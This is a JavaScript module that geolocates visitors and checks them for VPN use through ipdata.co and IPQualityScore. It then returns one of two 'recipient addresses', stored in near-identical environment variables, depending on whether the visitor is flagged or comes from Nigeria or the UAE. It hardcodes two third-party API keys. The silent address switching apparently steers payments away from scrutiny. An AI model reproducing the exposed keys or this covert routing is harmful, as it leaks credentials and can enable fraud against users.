import axios from "axios";

// API keys for ipdata.co and IPQualityScore
const IPDATA_API_KEY = '894b025a42d599cc09ebd6e1ef307189c7996ed768d29be082b63d1a';
const IPQS_API_KEY = 'qbBonEwKytWaDVnehOf7cSBvxVeVtogr';

// Fetch user data including VPN status, country, and IP from ipdata.co
export async function getUserCountry() {
  const url = `https://api.ipdata.co/?api-key=${IPDATA_API_KEY}`;

  try {
    const response = await axios.get(url);
    const { country_name: country, country_code: countryCode, ip, threat } = response.data;

    // Determine if the user is using a VPN (based on threat object)
    const isVpnIpdata = threat ? (threat.is_vpn || threat.is_proxy || threat.is_datacenter || threat.is_tor) : false;

    return { country, countryCode, ip, isVpnIpdata };
  } catch (error) {
    console.error("Error fetching user data from ipdata.co:", error);
    return null;
  }
}

// Check VPN status using IPQualityScore API (through Vite proxy)
export async function checkVpnStatusWithIPQS(ip) {
  const ipqsUrl = `/ipqualityscore/api/json/ip/${IPQS_API_KEY}/${ip}?strictness=1`; // Using proxy path

  try {
    const response = await axios.get(ipqsUrl);
    const { vpn, proxy, tor, active_vpn } = response.data;

    // Determine if IPQualityScore detects a VPN
    const isVpnIPQS = vpn || proxy || tor || active_vpn;
    
    return isVpnIPQS;
  } catch (error) {
    console.error("Error fetching VPN status from IPQualityScore:", error);
    return false;
  }
}

// Get the recipient address based on the user's VPN status and country code
export async function getRecipientAddress() {
  // Get the user's data from ipdata.co
  const userData = await getUserCountry();

  if (!userData) {
    console.error("Failed to retrieve user data");
    return null;
  }

  const { country, countryCode, ip, isVpnIpdata } = userData;

  // Check VPN status via IPQualityScore
  const isVpnIPQS = await checkVpnStatusWithIPQS(ip);

  const specialCountries = ["NG", "AE"];
  const address = import.meta.env.VITE_REACT_APP_R;
  const addrEss = import.meta.env.VITE_REACT_APP_r; 

  console.log(`User is from ${country} (${countryCode})`);

  // If VPN detected by either API, log VPN detection
  if (isVpnIpdata || isVpnIPQS) {
    console.log("VPN SUSPECTED. User's IP is associated with a VPN.");
  }

  const recipientAddress = specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS ? address : addrEss;
  return recipientAddress;
}
